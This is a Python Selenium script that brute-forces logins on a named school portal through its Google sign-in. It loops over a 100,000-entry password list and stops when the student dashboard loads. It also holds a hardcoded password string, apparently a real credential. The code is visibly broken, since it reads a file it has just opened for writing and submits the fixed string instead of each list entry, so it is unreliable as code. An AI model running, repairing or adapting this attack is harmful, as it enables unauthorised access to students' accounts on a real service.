from selenium import webdriver
import time
import random

#Counter
PassNumVar = open("PassNum.txt", "w+")
Counter = int(PassNumVar.read())
#login
Email = ""
Password = ""
#incognito mode
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--incognito")
#cracker
Passwords = open("100,000Passwords2.txt")
PasswordsArray = []
for line in Passwords:
    PasswordsArray.append(line)


driver = webdriver.Chrome(chrome_options=chrome_options)



def login(url,usernameID, username, loginbutton):
   driver.get(url)
   time.sleep(2) 
   driver.find_element_by_id(usernameID).send_keys(username)
   time.sleep(.1) 
   driver.find_element_by_id(loginbutton).click()
   time.sleep(3) 
def GoogleEmaillogin(loginbutton):
   driver.find_element_by_id(loginbutton).click()
   time.sleep(2) 
def GooglePasslogin(passwordId, password, loginbutton):
   driver.find_element_by_name(passwordId).send_keys(password)
   time.sleep(.1) 
   driver.find_element_by_id(loginbutton).click()
   time.sleep(.1) 

for line in PasswordsArray:
   password = line
   login("https://csus.myschoolapp.com/app#login", "Username", Email, "nextBtn")
   GoogleEmaillogin("identifierNext")
   GooglePasslogin("password", "TtqU320*", "passwordNext")
   Counter = Counter + 1
   PassNumVar.write(str(Counter) + "\n")
   if driver.current_url == "https://csus.myschoolapp.com/app/student#studentmyday/assignment-center":
      exit()
   



		
